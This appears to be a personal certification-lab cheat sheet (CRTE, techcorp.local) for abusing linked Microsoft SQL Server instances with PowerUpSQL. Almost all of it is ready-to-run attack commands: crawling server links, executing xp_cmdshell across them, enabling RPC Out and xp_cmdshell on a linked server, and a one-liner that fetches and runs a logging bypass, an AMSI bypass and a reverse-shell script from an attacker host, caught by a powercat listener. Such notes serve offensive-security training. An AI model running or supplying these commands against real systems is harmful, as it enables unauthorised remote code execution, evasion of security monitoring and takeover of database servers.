# Methodology
>1. Enumerate links to remote servers.
>2. Abuse links to get foothold on remote servers.

---
# Powershell
>**ℹ️ Info:**
>
> Remember to follow the [PowerShell scripts methodology](Notes/Certifications/CRTE/00%20-%20Miscellaneous/01-%20Methodology.md#PowerShell%20Scripts).

## PowerUpSQL
https://github.com/NetSPI/PowerUpSQL/blob/master/PowerUpSQL.psd1

**Enumerate MSSQL links:**
```powershell
Get-SQLServerLink -Instance us-mssql.us.techcorp.local -Verbose
```

**Crawl MSSQL links:**
```powershell
Get-SQLServerLinkCrawl -Instance us-mssql -Verbose
```

**Execute command where xp_cmdshell enabled:**
```powershell
Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''whoami'''
```

**Reverse shell on specific MSSQL instance with disabled logging, AMSI bypass and powercat.ps1:**
https://github.com/besimorhino/powercat/blob/master/powercat.ps1
```powershell
# Set up listener
powercat -l -v -p 443 -t 1000

# Reverse shell
Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://192.168.1.131/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.1.131/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.1.131/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget db-sqlsrv
```

**Enable RPC Out and xp_cmdshell:**
```powershell
Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc', @optvalue='TRUE'"
Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc out', @optvalue='TRUE'"
Invoke-SqlCmd -Query "EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT ""db-sqlsrv"""
```